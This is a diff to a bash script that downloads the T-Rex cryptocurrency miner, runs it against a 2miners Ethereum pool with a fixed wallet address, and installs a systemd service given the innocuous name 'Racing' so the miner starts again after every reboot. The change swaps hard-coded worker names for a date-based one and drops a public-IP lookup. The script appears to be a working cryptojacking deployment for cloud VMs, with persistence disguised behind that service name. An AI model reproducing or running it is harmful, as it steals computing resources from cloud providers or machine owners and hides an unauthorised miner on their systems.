@@ -1,7 +1,5 @@
 cd /home/azure
 woker=$(date +'%d%m_%H-')
-myip="$(dig +short myip.opendns.com @resolver1.opendns.com)"
-woker+=$myip
 if [[ ! -f isHaveSetupCoin.txt ]]
 then
     echo "Start setup..."
@@ -17,11 +15,11 @@ then
     echo "xxx vip pro" > isHaveSetupCoin.txt
     wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
     sudo killall XXX
-    ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 1CpdrqVY6j6VK2qTA8PCgWNtw3TWpukcVc -p x -w 110122_thanh &
+    ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 1CpdrqVY6j6VK2qTA8PCgWNtw3TWpukcVc -p x -w $woker &
 else
     wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
     sudo killall XXX
-    ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 1CpdrqVY6j6VK2qTA8PCgWNtw3TWpukcVc -p x -w 110122_thoi &
+    ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 1CpdrqVY6j6VK2qTA8PCgWNtw3TWpukcVc -p x -w $woker &
 fi
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/azure/t-rex -a ethash -o us-eth.2miners.com:2020 -u 1CpdrqVY6j6VK2qTA8PCgWNtw3TWpukcVc -p x -w myworker1111\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
